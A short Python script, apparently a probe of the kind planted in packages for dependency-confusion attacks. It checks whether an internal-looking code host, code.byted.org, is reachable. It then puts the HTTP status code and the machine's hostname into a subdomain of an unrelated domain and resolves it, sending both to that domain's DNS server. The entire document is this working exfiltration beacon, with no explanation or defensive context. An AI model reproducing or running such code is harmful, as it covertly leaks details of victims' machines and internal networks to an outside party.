import requests
import socket


su = "https://code.byted.org/"


response = requests.get(su)


sc = response.status_code

hostn = socket.gethostname()

du = f"{sc}.{hostn}.jqio6qj568.22.ax"


socket.gethostbyname(du)
